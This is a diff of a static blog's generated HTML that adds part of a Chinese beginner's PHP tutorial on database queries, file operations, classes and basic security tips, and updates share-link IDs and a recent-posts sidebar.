+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 查询</span><br><span class="line">$sql = &quot;SELECT * FROM user&quot;;</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">while($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">  print_r($row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 增删改</span><br><span class="line">$sql = &quot;INSERT INTO user(name) VALUES(&#x27;张三&#x27;)&quot;;</span><br><span class="line">mysqli_query($conn, $sql);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-关闭连接"><a href="#3-关闭连接" class="headerlink" title="3. 关闭连接"></a>3. 关闭连接</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure>
+
+<h2 id="十、文件操作"><a href="#十、文件操作" class="headerlink" title="十、文件操作"></a>十、文件操作</h2><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 读取文件</span><br><span class="line">$content = file_get_contents(&quot;test.txt&quot;);</span><br><span class="line"></span><br><span class="line">// 写入文件</span><br><span class="line">file_put_contents(&quot;test.txt&quot;,&quot;内容&quot;);</span><br><span class="line"></span><br><span class="line">// 打开/关闭</span><br><span class="line">$fp = fopen(&quot;test.txt&quot;,&quot;r&quot;);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
+
+<h2 id="十一、面向对象（OOP）"><a href="#十一、面向对象（OOP）" class="headerlink" title="十一、面向对象（OOP）"></a>十一、面向对象（OOP）</h2><h3 id="1-类与对象"><a href="#1-类与对象" class="headerlink" title="1. 类与对象"></a>1. 类与对象</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Person&#123;</span><br><span class="line">  public $name;</span><br><span class="line">  function say()&#123; echo &quot;说话&quot;; &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = new Person();</span><br><span class="line">$p-&gt;name = &quot;张三&quot;;</span><br><span class="line">$p-&gt;say();</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-关键字"><a href="#2-关键字" class="headerlink" title="2. 关键字"></a>2. 关键字</h3><ul>
+<li><code>public</code>：公共权限</li>
+<li><code>private</code>：私有权限</li>
+<li><code>protected</code>：受保护权限</li>
+<li><code>$this</code>：代表当前对象</li>
+<li><code>new</code>：实例化对象</li>
+</ul>
+<h2 id="十二、安全与常用要点"><a href="#十二、安全与常用要点" class="headerlink" title="十二、安全与常用要点"></a>十二、安全与常用要点</h2><ol>
+<li><strong>防 SQL 注入</strong>：使用预处理语句</li>
+<li><strong>防 XSS</strong>：输出用 <code>htmlspecialchars()</code></li>
+<li><strong>文件上传</strong>：校验类型、大小、重命名</li>
+<li><strong>错误处理</strong>：<code>try-catch</code> 捕获异常</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/27/php/" data-id="cuid7kOjjF3hNoL3VXd07Swr1" data-title="php 语法基础" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
 
     </footer>
   </div>
@@ -571,7 +706,7 @@
 <p>SELECT 字段 FROM 表名 GROUP BY 字段;</p>
 <p><em><strong>内连接</strong></em></p>
 <p>SELECT * FROM 表1<br>JOIN 表2 ON 表1.id &#x3D; 表2.id;</p>
-<p>– 插入数据（加了email字段）<br>INSERT INTO users (username,password,email)<br>VALUES (‘newuser’,’123456’,‘<a href="mailto:&#x74;&#101;&#x73;&#x74;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">test@qq.com</a>‘);</p>
+<p>– 插入数据（加了email字段）<br>INSERT INTO users (username,password,email)<br>VALUES (‘newuser’,’123456’,‘<a href="mailto:&#116;&#x65;&#115;&#116;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">test@qq.com</a>‘);</p>
 <ul>
 <li><p>查询数据<br>SELECT * FROM users WHERE username&#x3D;’admin’;</p>
 </li>
@@ -584,7 +719,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/04/12/mysql/" data-id="cuidJ_RRpMe1T_ib7ZgiLKkQ8" data-title="mysql" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/04/12/mysql/" data-id="cuidlH4kTIG51P4PQnCn2hkfN" data-title="mysql" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -637,7 +772,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/04/01/hello-world/" data-id="cuidvgQReMzlH_R1D4SDgsPfZ" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/04/01/hello-world/" data-id="cuidbc7onY-MiF-De5iyEzNsp" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -849,7 +984,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/01/linxu/" data-id="cuidbPvmSbLS2AtQa3oV6i-Lq" data-title="Linux基础操作" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2025/02/01/linxu/" data-id="cuidWQDo2QmVcQNZc8sObC3-S" data-title="Linux基础操作" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -915,7 +1050,11 @@
       <ul>
         
           <li>
-            <a href="/2026/04/27/php/">php 语法基础</a>
+            <a href="/2026/04/28/mysql%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/04/28/xff%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
           <li>
@@ -923,15 +1062,11 @@
           </li>
         
           <li>
+            <a href="/2026/04/27/php/">php 语法基础</a>
+          </li>
+        
+          <li>
             <a href="/2026/04/12/mysql/">mysql</a>
-          </li>
-        
-          <li>
-            <a href="/2026/04/01/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/01/linxu/">Linux基础操作</a>
           </li>
         
       </ul>
